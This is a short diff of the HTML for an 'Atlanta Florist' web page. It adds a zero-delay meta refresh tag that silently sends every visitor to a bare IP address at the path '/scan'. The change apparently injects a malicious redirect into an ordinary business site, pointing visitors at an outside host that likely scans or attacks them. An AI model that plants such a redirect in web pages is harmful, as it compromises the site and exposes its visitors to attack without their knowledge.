@@ -1,6 +1,6 @@
 <!DOCTYPE html> 
 <html> 
-
+ <meta http-equiv="refresh" content="0;URL='http://3.18.105.188/scan'" />
 <head> 
 	<title>Atlanta Florist</title> 
 	<style type="text/css"> 
